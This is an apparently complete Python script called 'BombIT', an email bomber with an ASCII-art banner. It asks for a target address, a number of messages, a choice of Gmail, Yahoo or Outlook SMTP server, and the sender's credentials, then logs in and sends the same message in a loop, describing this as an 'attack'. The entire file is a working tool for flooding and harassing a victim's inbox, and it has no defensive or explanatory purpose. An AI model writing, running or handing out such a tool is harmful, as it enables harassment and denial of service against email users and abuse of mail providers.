
#!/usr/bin/python3

import smtplib
import sys

class colors:
	RED = '\033[91m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'

print("\n")


logo1 = '88""Yb  dP"Yb  8b    d8 88""Yb 88 888888'
logo2 = '88__dP dP   Yb 88b  d88 88__dP 88   88'
logo3 = '88""Yb Yb   dP 88YbdP88 88""Yb 88   88'
logo4 = '88oodP  YbodP  88 YY 88 88oodP 88   88'

print(colors.RED + logo1)
print(colors.YELLOW + logo2)
print(colors.YELLOW + logo3)
print(colors.RED + logo4)

print("\n")

title = 'Welcome to BombIT!'
print(colors.GREEN + title)

print("\n")

print("<-------------------------------------------->")

count = 0
target = str(input(colors.RED + 'Target Email Address: '))
amount = int(input(colors.RED + 'Number of mails you want to send: '))

if int(amount) < int(1):
	print("\n")
	print("ERROR: Invalid Input")
	sys.exit(1)
else:
	print(colors.GREEN + "Your target is set to",target + " and the number of mails will be",amount)

server = str(input(colors.RED + '\nSelect the Email Server - 1:Gmail 2:Yahoo 3:Outlook : '))

if server == '1':
	server = 'smtp.gmail.com'
	print(colors.GREEN + "Your selected server is", server)
elif server == '2':
	server = 'smtp.mail.yahoo.com'
	print(colors.GREEN + "Your selected server is", server)
elif server == '3':
	server = 'smtp-mail.outlook.com'
	print(colors.GREEN + "Your selected server is", server)
else:
	print("ERROR: Invalid Input")
	sys.exit(1)

uadd = str(input(colors.RED + '\nThe Email address from which you want to send the mails: '))
upwd = str(input(colors.RED + 'Password: '))
usub = str(input(colors.RED + 'Subject of the mails: '))
umsg = str(input(colors.RED + 'Message of the mails: '))

payload = '''From: %s\nTo: %s\nSubject: %s\n%s\n''' % (uadd, target, usub, umsg)

print(colors.GREEN + "\nEmail Setup Successful")
print(colors.RED + "\nStarting the attack now!\nYou will be notified once the attack is finished.\nThis may take a while...")
port = int(587)

ss = smtplib.SMTP(server, port)
ss.ehlo()
ss.starttls()
ss.ehlo()
ss.login(uadd, upwd)


for x in range(amount+1):
	ss.sendmail(uadd, target, payload)
	count +=1

ss.close()

print(colors.GREEN + "\nAttack Finished Successfully.")
sys.exit(0)











